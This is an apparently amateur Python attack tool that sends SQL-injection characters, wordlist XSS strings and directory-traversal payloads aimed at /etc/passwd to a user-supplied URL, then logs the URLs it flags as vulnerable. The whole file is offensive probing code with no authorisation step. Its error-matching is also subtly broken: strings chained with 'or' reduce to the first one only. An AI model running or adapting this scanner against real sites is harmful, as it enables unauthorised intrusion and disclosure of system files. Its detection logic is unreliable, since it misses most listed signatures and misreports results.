#!/usr/bin/python3
import requests
from colorama import *
import re
import os
import random
import argparse
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

try:
    os.mkdir("logs")
except:
    pass
if os.name == "nt":
    os.system("cls")
elif os.name == "posix":
    os.system("clear")
else:
    print("System Not Support!")
    sys.exit()
fr = Fore.LIGHTRED_EX
fg = Fore.LIGHTGREEN_EX
fb = Fore.LIGHTBLUE_EX
fm = Fore.LIGHTMAGENTA_EX
fc = Fore.LIGHTCYAN_EX
rcl = random.choice([fr,fg,fb,fm,fc])

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'}
xss_payloads = open('wordlist/xss_payloads.txt', 'r')
sql_payloads = ["'", '"', "%27", "%23", "#", "%3B", ";", "%%2727", "%%2323", "%27%2B%27HERP"]
lfi_payloads = ["..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd", "/../../../../../../../../../../etc/passwd", "/../../../../../../../../../../etc/passwd^", ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd", "..\..\..\..\..\..\..\..\..\..\etc\passwd", "../../../../../../../../../../../../../../../../../../etc/passwd", "../../../../../../../../../../../../../../../../../../../../etc/passwd", "../../../../../../../../../../../../../../../../../../../../../etc/passwd", "/etc/passwd", "/..\../..\../..\../..\../..\../..\../etc/passwd"]
sqli_errors = ("SQL syntax" or "Warning" or "valid MySQL result" or "MySqlClient" or "PostgreSQL. ERROR" or "Warning." or "valid PostgreSQL result" or "Npgsql." or "Microsoft Access Driver" or "JET Database Engine" or "Access Database Engine")
lfi_errors = ("root:x:0:0:root:/root:" or "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" or "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin")

def sqli(target):
    for payload in sql_payloads:
        r = requests.get(f"{target}{payload}", headers=headers, timeout=10)
        html = r.text
        if sqli_errors in html:
            print(f"{Fore.GREEN}[+] {target}{payload} | {Fore.RED}SQLI")
            with open('logs/sqli_logs.txt', 'a') as file:
                file.write(target+payload)
                file.close()
        else:
            print(f"{Fore.RED}[*] {target}{payload} | {Fore.RED}Not SQLI")

def xss(target):
    try:
        for payload in xss_payloads:
            res = requests.get(f"{target}{payload}", headers=headers, timeout=10)
            if payload in res.text:
                print(f"{Fore.GREEN}[+] {target}{payload} | {Fore.RED}XSS")
                with open('logs/xss_logs.txt', 'a') as file:
                    file.write(target+payload)
                    file.close()
            else:
                print(f"{Fore.RED}[*] {target}{payload} | {Fore.RED}Not XSS")
    except requests.exceptions.ConnectionError:
        pass

def lfi(target):
    for payload in lfi_payloads:
        r = requests.get(f"{target}{payload}", headers=headers, timeout=10)
        html = r.text
        if lfi_errors in html:
            print(f"{Fore.GREEN}[+] {target}{payload} | {Fore.RED}LFI")
            with open('logs/lfi_logs.txt', 'a') as file:
                file.write(target+payload)
                file.close()
        else:
            print(f"{Fore.RED}[*] {target}{payload} | {Fore.RED}Not LFI")

def all_attack(url):
    sqli(url)
    lfi(url)
    xss(url)

def main():
    banner = f"""

{rcl} __   __           _______            
{rcl} \ \ / /          |__   __|           
{rcl}  \ V / ___ _ __ ___ | |_      _____  
{rcl}   > < / _ \ '__/ _ \| \ \ /\ / / _ \  {fr}[Coded By ASTRO]
{rcl}  / . \  __/ | | (_) | |\ V  V / (_) | {fr}[    Ver 1.0   ]
{rcl} /_/ \_\___|_|  \___/|_| \_/\_/ \___/ 
                                                                            
    """
    print(banner)

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Enter Target ! With (http/s)", required=True)
    args = parser.parse_args()
    target = args.url
    all_attack(target)

main()